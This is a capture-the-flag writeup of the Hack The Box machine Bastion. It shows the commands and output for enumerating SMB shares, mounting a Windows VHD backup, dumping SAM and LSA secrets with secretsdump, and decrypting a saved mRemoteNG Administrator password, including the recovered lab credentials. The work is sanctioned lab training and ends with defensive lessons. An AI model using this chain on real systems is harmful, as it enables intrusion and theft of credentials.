---
title: HTB Bastion Writeup
date: 2026-09-04 01:55:00 +0400
categories: [HTB, Easy]
tags: [smb, vhd, registry-hacking, credential-extraction, mremoteng, ssh]
---

# HTB Bastion — Writeup

**Machine**: Bastion | **OS**: Windows Server 2016 Standard | **Difficulty**: Easy | **IP**: 10.129.136.29

---

## Machine Information

- **Operating System**: Windows Server 2016 Standard (Build 14393)
- **Computer Name**: BASTION
- **Domain**: Workgroup
- **Primary Services**: SMB, SSH, WinRM
- **Notable Software**: mRemoteNG

---

## Reconnaissance & Enumeration

### Nmap Scan

Performed comprehensive port scan:

```bash
nmap -sC -sV 10.129.136.29
```

**Scan Results:**

```
Nmap scan report for 10.129.136.29
Host is up (0.25s latency)
Not shown: 994 closed tcp ports (conn-refused)

PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH for Windows_7.9 (protocol 2.0)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9415/tcp filtered unknown
```

**System Information:**

```
OS: Windows Server 2016 Standard 14393
Computer name: Bastion
Workgroup: WORKGROUP
Message signing: enabled but not required
SMB version: SMBv1 and SMBv2 supported
```

**Key Findings:**
- SSH available (unusual for Windows Server, but enabled here)
- SMB exposed and accessible
- RPC services running
- WinRM on port 5985
- SMBv1 enabled (deprecated but default)

### SMB Share Enumeration

Listed available shares:

```bash
smbclient -L //10.129.136.29
```

**Shares Discovered:**

```
Sharename        Type Comment
---------        ---- -------
ADMIN$           Disk Remote Admin
Backups          Disk
C$               Disk Default share
IPC$             IPC  Remote IPC
```

**Key Finding:** `Backups` share is accessible with guest credentials!

### Backups Share Exploration

Connected to Backups share with guest (no password):

```bash
smbclient -N //10.129.136.29/Backups
```

**Share Contents:**

```
.                          D  0 Tue Apr 16 06:02:11 2019
..                         D  0 Tue Apr 16 06:02:11 2019
note.txt                  AR  116 Tue Apr 16 06:10:09 2019
SDT65CB.tmp                A  0 Fri Feb 22 07:43:08 2019
WindowsImageBackup        Dn  0 Fri Feb 22 07:44:02 2019
```

### Retrieving note.txt

Downloaded and read the note:

```bash
get note.txt
cat note.txt
```

**Content:**

```
Sysadmins: please don't transfer the entire backup file locally, 
the VPN to the subsidiary office is too slow.
```

**Analysis:** This note hints that a backup file exists but shouldn't be transferred. However, we can mount it locally instead!

---

## VHD Extraction & Registry Hive Analysis

### Mounting Backups Share

Mounted the SMB share to the local filesystem:

```bash
sudo mount -t cifs //10.129.136.29/backups /mnt -o username=guest,password=
ls /mnt
```

**Output:**

```
note.txt
SDT65CB.tmp
WindowsImageBackup
```

### Discovering VHD Files

Located the Windows Image Backup files:

```bash
find /mnt/ -type f
```

**VHD Files Found:**

```
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd (37MB)
/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd (5.4GB)
```

**Observation:** Two VHD files — one small (37MB), one large (5.4GB). The larger one is likely the full system disk.

### Installing guestmount

Installed tools for VHD mounting:

```bash
sudo apt update
sudo apt install libguestfs-tools
```

### Mounting VHD File

Mounted the larger VHD to access the filesystem:

```bash
sudo mkdir /mnt/vhd
sudo guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
```

### Exploring Mounted Filesystem

Listed the mounted VHD contents:

```bash
sudo ls -l /mnt/vhd
```

**Output:**

```
total 2096729
drwxrwxrwx 1 root root         0 Feb 22 2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root        24 Jun 10 2009 autoexec.bat
-rwxrwxrwx 1 root root        10 Jun 10 2009 config.sys
lrwxrwxrwx 2 root root        14 Jul 14 2009 'Documents and Settings' -> /sysroot/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22 2019 pagefile.sys
drwxrwxrwx 1 root root         0 Feb 22 2019 PerfLogs
drwxrwxrwx 1 root root      4096 Jul 14 2009 ProgramData
drwxrwxrwx 1 root root      4096 Apr 11 2011 'Program Files'
drwxrwxrwx 1 root root         0 Feb 22 2019 Recovery
drwxrwxrwx 1 root root      4096 Feb 22 2019 'System Volume Information'
drwxrwxrwx 1 root root      4096 Feb 22 2019 Users
drwxrwxrwx 1 root root     16384 Feb 22 2019 Windows
```

**Success!** Full Windows filesystem accessible!

### Extracting Registry Hives

Copied critical registry hive files:

```bash
mkdir -p /tmp/bastion-hives
sudo cp /mnt/vhd/Windows/System32/config/SAM /tmp/bastion-hives/
sudo cp /mnt/vhd/Windows/System32/config/SECURITY /tmp/bastion-hives/
sudo cp /mnt/vhd/Windows/System32/config/SYSTEM /tmp/bastion-hives/
cd /tmp/bastion-hives
```

### Dumping Password Hashes

Used Impacket's secretsdump to extract credentials:

```bash
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

**Output:**

```
[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets

[*] DefaultPassword
(Unknown User):bureaulampje

[*] DPAPI_SYSTEM
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
```

**Critical Discovery:** Found cached password for L4mpje in LSA Secrets!

```
L4mpje:bureaulampje
```

---

## Credential Validation & Access

### Verifying Credentials

Validated the discovered credentials:

```bash
nxc smb 10.129.136.29 -u L4mpje -p 'bureaulampje' --shares
```

**Output:**

```
SMB 10.129.136.29 445 BASTION [*] Windows Server 2016 Standard 14393 x64
SMB 10.129.136.29 445 BASTION [+] Bastion\L4mpje:bureaulampje

SMB 10.129.136.29 445 BASTION [*] Enumerated shares
SMB 10.129.136.29 445 BASTION Share Permissions Remark
SMB 10.129.136.29 445 BASTION ----- ----------- ------
SMB 10.129.136.29 445 BASTION ADMIN$ Remote Admin
SMB 10.129.136.29 445 BASTION Backups READ,WRITE
SMB 10.129.136.29 445 BASTION C$ Default share
SMB 10.129.136.29 445 BASTION IPC$ READ Remote IPC
```

**Confirmed:** Credentials are valid!

### SSH Access as L4mpje

Connected via SSH using the discovered credentials:

```bash
ssh L4mpje@10.129.136.29
```

**Prompt:**

```
l4mpje@BASTION C:\Users\L4mpje>
```

### Capturing User Flag

Retrieved user flag:

```bash
type C:\Users\L4mpje\Desktop\user.txt
```

---

## Privilege Escalation

### Discovering mRemoteNG

While exploring the system, discovered mRemoteNG (remote connection manager):

```bash
dir "C:\Program Files (x86)\mRemoteNG"
```

**Found:** mRemoteNG configuration directory with saved credentials!

### Extracting mRemoteNG Config

Located the configuration file:

```bash
type C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml
```

**Relevant Output:**

```xml
"Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```

**Critical Finding:** Administrator password is encrypted in the config file!

### Decrypting mRemoteNG Password

Found decryption tool for mRemoteNG:

Tool source: https://4l3xbb.github.io/Cyb3rBook/002-PENTESTING/899-TOOLS/PASSWORD-DECRYPTION

**Initial Error:**

```bash
python3 exploit.py --password "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```

**Error Output:**

```
Traceback (most recent call last):
File "/home/cyberhitman3/exploit.py", line 3, in 
from Crypto.Cipher import AES
ModuleNotFoundError: No module named 'Crypto'
```

**Solution:** Install required cryptography library:

```bash
pip install pycryptodome
```

### Running Decryption

Re-executed the exploit:

```bash
python3 exploit.py --password "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
```

**Successful Output:**

```
[*] Encrypted 🔒: aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
[*] Plain 🔓: thXLHM96BeKL0ER2
```

**Administrator Credentials Obtained:**

```
Username: Administrator
Password: thXLHM96BeKL0ER2
```

---

## Post-Exploitation & Flag Capture

### Capturing Root Flag

With Administrator credentials obtained, retrieved the root flag:

```bash
type C:\Users\Administrator\Desktop\root.txt
```

---

## Summary & Key Takeaways

### Attack Chain

1. **SMB Enumeration** → Discovered Backups share accessible with guest
2. **VHD Discovery** → Found Windows Image Backup files in Backups share
3. **VHD Mounting** → Used guestmount to mount VHD locally
4. **Registry Extraction** → Copied SAM, SECURITY, SYSTEM hive files
5. **Hash Dumping** → Used secretsdump.py to extract credentials
6. **Cached Password** → Found L4mpje:bureaulampje in LSA Secrets
7. **Credential Validation** → Verified credentials via SMB
8. **SSH Access** → Logged in as L4mpje user
9. **User Flag** → Captured user.txt
10. **mRemoteNG Discovery** → Found saved Administrator credentials
11. **Password Decryption** → Decrypted encrypted Administrator password
12. **Root Access** → Obtained Administrator credentials
13. **Root Flag** → Captured root.txt

### Key Vulnerabilities

- **Accessible Backups Share** — SMB share with backup files publicly accessible
- **Guest Access Enabled** — No authentication required for Backups share
- **VHD Backup Exposure** — Full Windows system backup accessible
- **Unencrypted Hives** — Registry hives not protected after extraction
- **Cached Passwords** — LSA Secrets stored plaintext credentials
- **mRemoteNG Config Storage** — Credentials saved with weak encryption
- **Default mRemoteNG Keys** — Encryption uses predictable keys
- **Administrator Credentials Exposed** — Plaintext in mRemoteNG config

### Critical Details

- **VHD files** contain complete Windows filesystem snapshots
- **secretsdump.py** can extract NTLM hashes and LSA Secrets
- **LSA Secrets** may contain plaintext or recoverable passwords
- **mRemoteNG** uses RC2 encryption with hardcoded keys
- **Password decryption** is trivial with proper tools
- **Privilege escalation** achieved through configuration file exploitation

### Tools Used

- `nmap` — Port scanning and service enumeration
- `smbclient` — SMB share connection and exploration
- `mount` — Mounting SMB shares locally
- `guestmount` — VHD file mounting
- `secretsdump.py` — Registry hive credential extraction
- `nxc (NetExec)` — Credential validation and share enumeration
- `ssh` — Remote access as L4mpje
- `python3` + mRemoteNG exploit — Password decryption

### Lessons Learned

- **Backup files are gold** — They often contain complete system snapshots
- **VHD mounting** allows offline access to Windows filesystem
- **Registry hives** contain plaintext and recoverable credentials
- **LSA Secrets** are often overlooked but contain critical passwords
- **mRemoteNG credentials** are easily decrypted
- **Guest access** should never allow access to sensitive shares
- **Backups require security** — Not just backup functionality
- **Defense-in-depth** — Multiple layers of security are essential

---

## Flags

- 🚩 **User Flag**: Captured from `C:\Users\L4mpje\Desktop\user.txt`
- 🚩 **Root Flag**: Captured from `C:\Users\Administrator\Desktop\root.txt`

**Machine: Completed ✓**
